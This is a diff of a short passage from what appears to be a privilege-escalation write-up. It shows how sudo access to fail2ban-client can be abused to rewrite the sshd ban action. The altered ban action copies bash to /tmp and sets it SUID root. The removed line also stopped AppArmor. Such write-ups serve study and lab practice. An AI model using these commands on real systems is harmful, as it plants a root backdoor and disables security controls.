@@ -36,7 +36,7 @@ Now, the interesting thing is that, using "fail2ban-client" command, we can reco
 
     sudo fail2ban-client restart
     sudo fail2ban-client unban --all
-    sudo fail2ban-client set "sshd" action "iptables-multiport" actionban "systemctl stop apparmor && cp /bin/bash /tmp/shell && chmod 4755 /tmp/shell"
+    sudo fail2ban-client set "sshd" action "iptables-multiport" actionban "cp /bin/bash /tmp/shell && chmod 4755 /tmp/shell"
 
 With the last instruction shown here, we are telling the "fail2ban" service to modify the blocking rule of clients that are trying to access the sshd server, replacing it with the new command just reported (which creates a malicious shell)
 
